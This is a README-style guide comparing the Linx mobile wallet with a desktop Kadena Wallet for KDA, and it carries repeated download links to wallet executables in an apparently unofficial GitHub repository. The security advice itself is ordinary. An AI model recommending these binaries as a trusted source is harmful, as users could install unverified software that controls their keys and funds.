![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Linx vs Kadena Wallet: Mobile Against Desktop</h1>

<p align="center">A Kadena Wallet guide to the network and the market.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

Linx became the default mobile answer in this ecosystem almost by accident: when Koala withdrew KDA support in November 2025, Linx was the maintained app that could open the accounts people already had. Kadena Wallet is the desktop answer. Comparing them is mostly a question of where you sign, and how much you trust the device you carry.

## You'll see this if

- You were told to move to Linx after Koala and want to know what you gained and lost.
- You hold a balance on a phone and are considering a desktop wallet instead.
- You want one wallet that works on both, and are deciding which to lead with.
- You use a hardware device and are unsure whether the mobile route supports it.

## The two, briefly

| | Linx | Kadena Wallet |
| --- | --- | --- |
| Form | Mobile application | Desktop application |
| Also supports | Another chain alongside Kadena | Kadena only |
| Hardware signing | Ledger over Bluetooth | Ledger through a browser connection |
| Imports | Koala, eckoWALLET and Chainweaver accounts | Kadena phrases, including legacy accounts |
| Best for | Signing while away from a desk | Holding and moving a balance deliberately |

Both are self-custody. Neither holds your coins. The difference is the machine the key sits on and the surface an attacker has to reach.

## Mobile is not a smaller desktop

The assumption that a phone app is the same product in a smaller window causes most of the bad decisions here.

**Where the key lives.** On a phone, the key sits in an operating system designed around app sandboxes and cloud backups. That is generally good, and it also means a photograph of a phrase can end up in a synced camera roll without anyone deciding to put it there.

**How you verify an address.** A phone screen shows a truncated address in most interfaces. Comparing a destination becomes a matter of trusting a prefix, which is exactly the weakness that clipboard malware exploits.

**How hardware connects.** Bluetooth is convenient and adds a radio link. A cable is dull and adds one fewer thing that can be impersonated.

**When the device is lost.** A phone leaves the house. A desktop usually does not. Loss of the device is not loss of funds if the phrase exists, but it is a real event that a desktop rarely experiences.

## What each is genuinely better at

**Linx, because it is mobile.** Checking a balance without sitting down. Signing while travelling. Opening accounts that were created in Koala, eckoWALLET or Chainweaver, which is the specific job it inherited. A Ledger over Bluetooth, for people who want device signing without a laptop.

**Kadena Wallet, because it is desktop.** Reading a full address on a large screen before approving it, which is the single highest-value habit in this whole category. Keeping the key out of the browser process and off the phone that leaves the building. Working across Windows, macOS and Linux from one tagged release, which matters if your machine changes.

Neither advantage is decisive on its own. Together they usually point at using both, with one as the working wallet and the other as a fallback you have tested.

## Moving between them

Migration is a restore in both directions, and it follows the same rule as every other wallet change: the address decides.

1. Take the phrase out of the wallet you are quitting, or find the paper copy written at setup.
2. Import it into the other wallet.
3. Hold the new address against the funded one, character by character.
4. Check the chain, because an account with a balance on chain 3 shows nothing on chain 0.
5. Send a small test amount if you want proof that signing works.

Matching addresses mean either product can sign for the same balance, so switching costs nothing. A mismatch means the two build different keys, and the funds sit under whichever one produced the funded string.

## The Koala inheritance, in one paragraph

Koala removed KDA support on 25 November 2025 and its 24-word phrase remained valid. The advice that circulated afterwards was to import those words into Linx, which worked for many people and left others with an empty account because the derivation or the chain differed. Linx imports Koala accounts by design, which is why it became the recommendation. That inheritance is also why so many "Linx shows nothing" reports are really "the chain selector was on the wrong chain" reports.

## Security differences worth naming

- **Screen size is a security feature.** A full address on a desktop monitor is checkable; a truncated one on a phone is not. Approve on the largest screen available to you.
- **App stores are a distribution channel, not a guarantee.** Impostor apps exist for both platforms. Take the install from the publisher, not from a search result.
- **Backups follow the operating system.** Phones sync photographs by default. Desktops usually do not. Neither protects a phrase written on paper.
- **Bluetooth and cables fail differently.** Both can be interrupted mid-signing; neither is more private by default. What matters is reading the destination on the device itself.

## Which to pick

- **KDA is a balance you check and rarely move.** Desktop, with the phrase offline. The phone adds exposure without adding much.
- **You need to sign while out.** Linx, and accept the smaller verification surface by double-checking addresses on an explorer before approving.
- **You use a Ledger.** Either works, and the more important question is which interface you trust to build the transaction.
- **You are recovering old accounts.** Derivation support decides, form factor is preference, and the product that rebuilds your funded address is the only one that can help.
- **You want redundancy.** Use both, after a restore test that proves they open the same account.

## FAQ

**Can I use Linx and Kadena Wallet with one phrase?**
Yes, if both derive the same accounts. Verify by comparing addresses before relying on either.

**Does Linx replace the need for a desktop wallet?**
It replaces the convenience, not the verification. A large screen and a separate process are still worth having for a balance you care about.

**Which one supports Koala accounts?**
Linx imports them explicitly. Kadena Wallet can open them if the derivation matches, which is worth testing rather than assuming.

**Is a phone less safe than a computer?**
Different, not simply less. Phones sandbox apps well and sync backups aggressively. Computers verify addresses better and carry more malware. The phrase's storage decides most of the outcome.

**Can I move back to Linx later?**
Yes. The phrase is portable in both directions as long as the derivation is supported, which is why the restore test is worth doing once now.

## Related reading

- Migrating from Koala to Kadena Wallet after KDA removal
- Zelcore vs Kadena Wallet: multi-asset against Kadena-first
- Best Kadena wallet in 2026: every option that still works
- Kadena Wallet vs eckoWALLET: desktop and extension compared

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [Chainweaver Alternative: What Kadena Wallet Users Should Know](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/chainweaver-alternative-kadena-wallet.md)
- [What Happened to Kadena: The Fourteen Months That Changed Everything](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/what-happened-to-kadena-network.md)
- [Is Kadena Dead? What Ended in 2025 and What Still Runs](https://github.com/kadena-developments/alternatives-and-market-notes/blob/main/is-kadena-dead-what-still-runs.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
